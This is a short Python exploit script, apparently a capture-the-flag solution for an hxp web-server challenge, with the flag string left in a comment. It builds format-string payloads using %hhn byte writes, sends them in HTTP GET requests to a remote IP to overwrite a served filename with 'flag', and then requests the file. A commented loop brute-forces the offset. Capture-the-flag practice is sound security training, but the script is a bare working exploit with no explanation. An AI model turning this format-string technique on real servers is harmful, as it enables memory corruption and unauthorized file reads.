from pwnlib import *

# on remote, "no.html" is at offset 203 

LOCAL = False

# hxp{53cur3 h77pd 15 w3b 5c4l3}

def make_socket():
	if LOCAL:
		s = Socket(("localhost", 1556))
	else:
		s = Socket(("104.198.77.112", 8080))
	return s



def write_to_word(wordnum, target_char):
	# reach TOS
	payload = "%02c"*4

	# reach ptr, minus 1
	payload += "%02c"*(wordnum-1)

	# pad to write the char we want
	nb_written = len(payload.replace("%02c", "XX"))
	nb_missing = target_char - nb_written
	if nb_missing < 2:
		nb_missing += 0x100
	payload += "%0" + str(nb_missing) + "c"

	# write to ptr
	payload += "%hhn"

	assert " " not in payload
	assert "\x00" not in payload # or what?

	s.send("GET %s HTTP/1.1\r\n\r\n" % payload)
	s.ru("Content-Length:")




#for offset in range(256):
#	s = make_socket()
#
#	write_to_word(13, offset)
#	write_to_word(39, 0x01)
#
#	payload = "/no.html"
#	s.send("GET %s HTTP/1.1\r\n\r\n" % payload)
#
#	s.ru("Content-Length: ")
#	length = s.ru("\n")
#
#
#	print "offset %d, content-length %s" % (offset, length)

s = make_socket()

if LOCAL:
	target = 143
else:
	target = 203

write_to_word(13, target)
write_to_word(39, ord("f"))
target += 1

write_to_word(13, target)
write_to_word(39, ord("l"))
target += 1

write_to_word(13, target)
write_to_word(39, ord("a"))
target += 1

write_to_word(13, target)
write_to_word(39, ord("g"))
target += 1

write_to_word(13, target)
write_to_word(39, ord("\x00"))
target += 1

raw_input("> ")
payload = ".flag"
s.send("GET %s HTTP/1.1\r\n\r\n" % payload)

s.interact()

